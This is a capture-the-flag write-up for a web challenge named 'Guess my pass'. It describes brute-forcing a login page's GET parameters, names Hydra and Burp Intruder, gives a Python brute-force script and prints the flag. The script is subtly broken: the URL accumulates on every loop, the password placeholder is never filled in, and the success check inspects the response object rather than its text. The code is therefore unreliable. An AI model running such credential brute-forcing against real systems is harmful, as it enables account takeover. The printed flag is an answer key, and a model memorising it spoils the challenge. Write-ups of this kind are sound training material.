
# Web: Guess my pass

Author: [some1hing](https://github.com/SOME-1HING/)
<br>

**Points**:  200
**Hint:**  None

**Challenge description:**
```
Guess my military grade super secret secret password.
```
#### Attachments:
passwords.txt
usernames.txt


## Solve

The login button in homepage leads to `/admin`.
As the challenge name and description hints, it requires a bruteforce attack on get parameter 'username' and 'password' in `/admin` endpoint.

Use Hydra/Burp Intruder to efficiently bruteforce using the given wordlists.

Python script
```python
#!/usr/bin/env python3
import requests

# bruteforcing the '/admin' page.
username = 'admin'
passwords = [i.strip() for i in open('passwords.txt','r').readlines()]

# login.php cause thats were the data is GET to.
URL = 'http://glitch.games:64500/login.php?'

for password in passwords:
	URL= URL+'username=admin&password={password}'
	r = requests.get(URL)
	if "Login failed. Incorrect username or password." not in r:
		print("Found pass:", password)
		break
```




#### Flag:
```plaintext
GLITCH{Th1s_Is_Sp4rt4!}
```
